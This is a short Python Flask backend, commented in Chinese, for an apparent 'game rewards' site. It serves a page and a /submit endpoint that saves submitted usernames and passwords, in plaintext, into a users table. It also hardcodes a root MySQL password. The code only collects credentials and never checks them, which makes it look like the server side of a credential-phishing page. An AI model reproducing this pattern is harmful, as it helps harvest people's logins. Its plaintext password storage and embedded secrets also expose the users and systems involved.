from flask import Flask, request, jsonify, send_file
   import psycopg2
   import os
   import urllib.parse

   app = Flask(__name__)

   # 数据库连接（支持 Render PostgreSQL 和本地 MySQL）
   if 'DATABASE_URL' in os.environ:
       # Render PostgreSQL
       url = urllib.parse.urlparse(os.environ['DATABASE_URL'])
       db = psycopg2.connect(
           host=url.hostname,
           user=url.username,
           password=url.password,
           database=url.path[1:],
           port=url.port
       )
   else:
       # 本地 MySQL
       import pymysql
       db = pymysql.connect(
           host='localhost',
           user='root',
           password='XIANtao981572',
           database='game_rewards',
           charset='utf8mb4'
       )

   @app.route('/')
   def index():
       with open('index.html', 'r', encoding='utf-8') as file:
           return file.read()

   @app.route('/submit', methods=['POST'])
   def submit():
       data = request.get_json()
       username = data['username']
       password = data['password']
       cursor = db.cursor()
       query = "INSERT INTO users (username, password) VALUES (%s, %s)"
       cursor.execute(query, (username, password))
       db.commit()
       cursor.close()
       return jsonify({'message': '数据保存成功'})

   @app.route('/background.jpg')
   def serve_background():
       return send_file('background.jpg')

   if __name__ == '__main__':
       app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 3000)))